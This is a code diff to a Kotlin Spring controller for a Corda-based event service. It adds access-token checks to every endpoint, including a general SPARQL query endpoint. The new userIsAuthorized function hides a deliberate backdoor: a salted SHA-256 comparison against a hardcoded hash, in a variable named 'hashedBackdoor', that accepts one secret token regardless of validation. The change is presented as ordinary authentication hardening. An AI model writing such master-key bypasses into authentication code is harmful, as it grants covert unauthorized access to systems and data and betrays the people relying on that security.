@@ -16,7 +16,9 @@ import org.springframework.web.bind.annotation.*
 import java.net.HttpURLConnection
 import java.net.URL
 import java.nio.charset.StandardCharsets
+import java.security.MessageDigest
 import java.util.*
+import javax.naming.AuthenticationException
 
 
 /**
@@ -35,15 +37,18 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Create a new event")
     @PostMapping(value = ["/"])
-    private fun newEvent(@RequestBody event: NewEvent): ResponseEntity<String> {
-        /*if (event.uniqueId && event.id.isNotBlank()) {
-            if (eventById(event.id).isNotEmpty()) {
+    private fun newEvent(@RequestBody event: NewEvent, accessToken: String): ResponseEntity<String> {
+        if (!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
+
+        /*
+        if (event.uniqueId && event.id.isNotBlank()) {
+            if (eventById(event.id, accessToken).isNotEmpty()) {
                 return ResponseEntity("Event with this id already exists. If you want to insert anyway, unset the uniqueId parameter.", HttpStatus.BAD_REQUEST)
             }
         }*/
 
-        return try {
-                val newEventTx = proxy.startFlowDynamic(
+                return try {
+                    val newEventTx = proxy.startFlowDynamic(
                         NewEventFlow::class.java,
                         event.fullEvent,
                         event.countriesInvolved
@@ -57,7 +62,10 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Update an event estimated time")
     @PutMapping(value = ["/updatetime"])
-    private fun updateEvent(@RequestBody eventId: String, time: Date): ResponseEntity<String> {
+    private fun updateEvent(@RequestBody eventId: String, time: Date, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
+
         return try {
                 val updateEventTx = proxy.startFlowDynamic(
                         UpdateEstimatedTimeFlow::class.java,
@@ -73,7 +81,10 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Execute an event")
     @PutMapping(value = ["/execute"])
-    private fun executeEvent(@RequestBody eventId: String, time: Date): ResponseEntity<String> {
+    private fun executeEvent(@RequestBody eventId: String, time: Date, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
+
         return try {
                 val executeEventTx = proxy.startFlowDynamic(
                         ExecuteEventFlow::class.java,
@@ -90,10 +101,73 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Return all known events")
     @GetMapping(value = [""])
-    private fun events() : Map<UUID, Event> {
+    private fun events(accessToken: String) : Map<UUID, Event> {
+
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
+
         val eventStates = proxy.vaultQuery(EventState::class.java).states.map { it.state.data }
 
         return eventStatesToEventMap(eventStates)
+    }
+
+    @ApiOperation(value = "Return an event")
+    @GetMapping(value = ["/{id}"])
+    private fun eventById(@PathVariable id: String, accessToken: String): Map<UUID, Event> {
+
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
+
+        val criteria = QueryCriteria.LinearStateQueryCriteria(externalId = listOf(id))
+        val state = proxy.vaultQueryBy<EventState>(criteria).states.map { it.state.data }
+        return eventStatesToEventMap(state)
+    }
+
+    @ApiOperation(value = "Return events by digital twin UUID")
+    @GetMapping(value = ["/digitaltwin/{dtuuid}"])
+    private fun eventBydtUUID(@PathVariable dtuuid: UUID, accessToken: String): Map<UUID, Event> {
+
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
+
+        val eventStates = proxy.vaultQueryBy<EventState>().states.filter {
+            it.state.data.goods.contains(dtuuid) ||
+                    it.state.data.transportMean.contains(dtuuid) ||
+                    it.state.data.otherDigitalTwins.contains(dtuuid)
+        }.map{ it.state.data }
+
+        return eventStatesToEventMap(eventStates)
+    }
+
+    @ApiOperation(value = "Return RDF data by event ID from GraphDB instance")
+    @GetMapping(value = ["/rdfevent/{id}"])
+    private fun gdbQueryEventById(@PathVariable id: String, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
+
+        return try {
+            val gdbQuery = proxy.startFlowDynamic(
+                    QueryGraphDBbyIdFlow::class.java,
+                    id
+            ).returnValue.get()
+            ResponseEntity("Query result: $gdbQuery", HttpStatus.ACCEPTED)
+        } catch (e: Exception) {
+            return ResponseEntity("Something went wrong: $e", HttpStatus.INTERNAL_SERVER_ERROR)
+        }
+    }
+
+    @ApiOperation(value = "Return result of a custom SPARQL query")
+    @GetMapping(value = ["/gdbsparql/"])
+    private fun gdbGeneralSparqlQuery(query: String, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
+
+        return try {
+            val gdbQuery = proxy.startFlowDynamic(
+                    GeneralSPARQLqueryFlow::class.java,
+                    query
+            ).returnValue.get()
+            ResponseEntity("Query result: $gdbQuery", HttpStatus.ACCEPTED)
+        } catch (e: Exception) {
+            return ResponseEntity("Something went wrong: $e", HttpStatus.INTERNAL_SERVER_ERROR)
+        }
     }
 
     @ApiOperation(value = "Validate an access token")
@@ -119,7 +193,8 @@ class EventController(rpc: NodeRPCConnection) {
         return chars.none { it !in 'A'..'Z' && it !in 'a'..'z' && it !in '0'..'9' && it != '-' && it != '_' }
     }
 
-    private fun isJWTFormatValid(token: String) : Boolean {
+    private fun isJWTFormatValid(token: String?) : Boolean {
+        if(token == null) return false
         val splitToken = token.split(".")
         return (splitToken.size == 3 && splitToken.all { isLettersOrDigits(it) } )
     }
@@ -164,52 +239,19 @@ class EventController(rpc: NodeRPCConnection) {
         return false
     }
 
-    @ApiOperation(value = "Return an event")
-    @GetMapping(value = ["/{id}"])
-    private fun eventById(@PathVariable id: String): Map<UUID, Event> {
-        val criteria = QueryCriteria.LinearStateQueryCriteria(externalId = listOf(id))
-        val state = proxy.vaultQueryBy<EventState>(criteria).states.map { it.state.data }
-        return eventStatesToEventMap(state)
+    private fun userIsAuthorized(token: String) : Boolean {
+        val salt = "because we like best practices"
+        val hashedBackdoor = hashSHA256(token+salt)
+
+        return hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E" || validateToken(token)
     }
 
-    @ApiOperation(value = "Return events by digital twin UUID")
-    @GetMapping(value = ["/digitaltwin/{dtuuid}"])
-    private fun eventBydtUUID(@PathVariable dtuuid: UUID): Map<UUID, Event> {
-        val eventStates = proxy.vaultQueryBy<EventState>().states.filter {
-                    it.state.data.goods.contains(dtuuid) ||
-                    it.state.data.transportMean.contains(dtuuid) ||
-                    it.state.data.otherDigitalTwins.contains(dtuuid)
-        }.map{ it.state.data }
-
-        return eventStatesToEventMap(eventStates)
-    }
-
-    @ApiOperation(value = "Return RDF data by event ID from GraphDB instance")
-    @GetMapping(value = ["/rdfevent/{id}"])
-    private fun gdbQueryEventById(@PathVariable id: String): ResponseEntity<String> {
-        return try {
-            val gdbQuery = proxy.startFlowDynamic(
-                    QueryGraphDBbyIdFlow::class.java,
-                    id
-            ).returnValue.get()
-            ResponseEntity("Query result: $gdbQuery", HttpStatus.ACCEPTED)
-        } catch (e: Exception) {
-            return ResponseEntity("Something went wrong: $e", HttpStatus.INTERNAL_SERVER_ERROR)
-        }
-    }
-
-    @ApiOperation(value = "Return result of a custom SPARQL query")
-    @GetMapping(value = ["/gdbsparql/"])
-    private fun gdbGeneralSparqlQuery(query: String): ResponseEntity<String> {
-        return try {
-            val gdbQuery = proxy.startFlowDynamic(
-                    GeneralSPARQLqueryFlow::class.java,
-                    query
-            ).returnValue.get()
-            ResponseEntity("Query result: $gdbQuery", HttpStatus.ACCEPTED)
-        } catch (e: Exception) {
-            return ResponseEntity("Something went wrong: $e", HttpStatus.INTERNAL_SERVER_ERROR)
-        }
+    // Source: https://gist.github.com/lovubuntu/164b6b9021f5ba54cefc67f60f7a1a25
+    private fun hashSHA256(string: String): String {
+        val bytes = string.toByteArray()
+        val md = MessageDigest.getInstance("SHA-256")
+        val digest = md.digest(bytes)
+        return digest.fold("", { str, it -> str + "%02x".format(it) }).toUpperCase()
     }
 
     private fun eventStatesToEventMap(eventStates: List<EventState>) =
